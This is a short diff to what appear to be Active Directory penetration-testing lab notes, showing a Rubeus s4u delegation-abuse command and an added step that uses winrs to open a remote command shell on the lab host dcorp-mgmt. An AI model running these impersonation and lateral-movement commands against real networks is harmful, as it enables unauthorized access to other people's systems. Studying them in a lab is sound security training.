@@ -520,4 +520,12 @@ Rubeus.exe s4u /user:dcorp-student1$
 ```
 
 
-We can then use `winrs` to 
+- We can then use `winrs` to access remote system, in this case `dcorp-mgmt`
+
+
+```powershell
+winrs -r:dcorp-mgmt cmd
+```
+
+^b6965a
+
